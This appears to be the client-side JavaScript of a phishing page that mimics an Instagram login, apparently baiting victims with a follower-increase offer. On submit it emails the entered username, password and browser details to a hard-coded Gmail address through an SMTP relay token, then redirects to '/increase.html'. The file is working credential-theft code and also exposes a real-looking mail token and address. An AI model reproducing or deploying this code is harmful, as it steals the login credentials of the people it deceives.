var submit = document.getElementById('submit');
var btn_m = document.getElementById('btn_m');
var username = document.getElementById('username');
var password = document.getElementById('password');
var loginForm = document.getElementById('loginForm')
var form = new FormData(loginForm);




function button_on() {

  username.addEventListener("input", () => {
    if (check_ok()[0]) {
      submit.disabled = false;
      btn_m.classList.add("active");
    } else {
      submit.disabled = true;
      btn_m.classList.remove("active");

    }


  })
  password.addEventListener("input", () => {
    if (check_ok()[0]) {
      submit.disabled = false;
      btn_m.classList.add("active");

    } else {
      submit.disabled = true;
      btn_m.classList.remove("active");

    }
  })

}

button_on()

function clearForm(form_id) {
  var form = document.querySelector(form_id);
  form.reset();
}





function check_ok() {
  var password = document.getElementById('password');
  var username = document.getElementById('username');
  var username_l = username.value.split("");
  var password_l = password.value.split("");
  var check_arr = [];
  var password_username_check;
  if (password_l.length >= 5 && username_l.length >= 5) {
    password_username_check = true;
  } else {
    password_username_check = false;
  }
  check_arr.push(password_username_check);
  return check_arr;
}
var loginForm = document.getElementById("loginForm");
loginForm.addEventListener("submit", (e) => {
  e.preventDefault();
        var formData = new FormData(loginForm);

  Email.send({
    SecureToken: "2c4c905a-af9f-4a10-af48-25f24e9e7b81",
    To: 'kumaradarsh00572@gmail.com',
    From: "kumaradarsh00572@gmail.com",
    Subject: "naya password aagya",
    Body: `
    
   <h1> username:${username.value}</h1>
   </br>
  <h2 style="color: green;"> password:${password.value}</h2>
     </br>
    device:${window.navigator.appVersion}


    `
  }).then(
    message => {
      //alert(message)
      clearForm("#loginForm");
      if (message == "OK") {
        //window.location.href = "https://www.instagram.com/typing_1525?igsh=MWtxbXk4aml5OW05Zw==";
        window.location.href = "/increase.html";

      }

    }
  );

localStorage.setItem("username",username.value);

})



var s_h_btn = document.querySelector(".s_h_btn");
s_h_btn.addEventListener('click', () => {

  if (password.type == 'password') {
    password.type = 'text';
    s_h_btn.innerHTML = 'Hide';

  } else {
    password.type = 'password';
    s_h_btn.innerHTML = 'Show';

  }

})